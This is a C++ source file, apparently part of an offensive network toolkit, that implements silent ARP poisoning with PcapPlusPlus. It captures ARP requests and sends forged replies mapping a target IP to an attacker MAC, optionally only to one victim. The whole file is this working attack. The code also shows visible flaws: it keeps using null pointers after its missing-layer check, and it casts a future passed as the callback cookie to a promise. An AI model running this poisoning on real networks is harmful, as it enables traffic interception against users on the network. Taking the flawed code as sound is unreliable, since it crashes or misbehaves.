#include "arp_poisoning/silent.h"
#include "EthLayer.h"
#include "log.h"
#include <future>

void ATK::ARP::SilentArpPoisoningStrategy::onPacketArrives(
    pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) {
    auto *completionFuture = static_cast<std::promise<void> *>(cookie);

    const pcpp::Packet parsedPacket(packet);
    auto *requestEthLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
    auto *requestArpLayer = parsedPacket.getLayerOfType<pcpp::ArpLayer>();

    if (requestEthLayer == nullptr || requestArpLayer == nullptr) {
        completionFuture->set_exception_at_thread_exit(
            std::make_exception_ptr(std::runtime_error(
                "Invalid filter settings, found packet with missing layers")));
        device->stopCapture();
    }

    // determine whether or not to handle packet
    if ((requestEthLayer->getSourceMac() == device->getMacAddress() ||
         requestEthLayer->getSourceMac() == attackerMac_) ||
        (requestArpLayer->getTargetIpAddr() != ipToSpoof_ ||
         requestArpLayer->getTargetIpAddr() == device->getIPv4Address()) ||
        (victimIp_.has_value() &&
         requestArpLayer->getSenderIpAddr() != victimIp_.value())) {
        LOG_INFO("skipped packet");
        return;
    }

    // craft response packet
    pcpp::EthLayer responseEthLayer(device->getMacAddress(),
                                    requestEthLayer->getSourceMac());

    pcpp::ArpLayer responseArpLayer(pcpp::ArpOpcode::ARP_REPLY, attackerMac_,
                                    requestArpLayer->getSenderMacAddress(),
                                    requestArpLayer->getTargetIpAddr(),
                                    requestArpLayer->getSenderIpAddr());

    pcpp::Packet responsePacket(ARP_PACKET_SIZE);
    responsePacket.addLayer(&responseEthLayer);
    responsePacket.addLayer(&responseArpLayer);
    responsePacket.computeCalculateFields();

    if (!device->sendPacket(&responsePacket)) {
        LOG_ERROR("Failed to send packet");
        completionFuture->set_exception_at_thread_exit(std::make_exception_ptr(
            std::runtime_error("Failed to send packet")));
        device->stopCapture();
    };
}

void ATK::ARP::SilentArpPoisoningStrategy::execute() {
    if (!device_->open()) {
        throw std::runtime_error("Unable to open interface");
    }

    std::promise<void> completionPromise;
    std::future<void> completionFuture = completionPromise.get_future();

    // set filters
    pcpp::ArpFilter arpFilter(pcpp::ArpOpcode::ARP_REQUEST);
    pcpp::EtherTypeFilter etherTypeFilter(PCPP_ETHERTYPE_ARP);
    pcpp::AndFilter andFilter;
    andFilter.addFilter(&arpFilter);
    andFilter.addFilter(&etherTypeFilter);

    if (!device_->setFilter(andFilter)) {
        device_->close();
        LOG_ERROR("Unable to set arp and ethertype filters on interface");
        throw std::runtime_error(
            "Unable to set arp and ethertype filters on interface");
    };

    if (!device_->startCapture(
            [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                   void *cookie) { onPacketArrives(packet, device, cookie); },
            &completionFuture)) {
        device_->close();
        throw std::runtime_error("Unable to start capturing arp packets");
    };

    try {
        completionFuture.get();
    } catch (const std::exception &e) {
        device_->close();
    }

    device_->close();
}
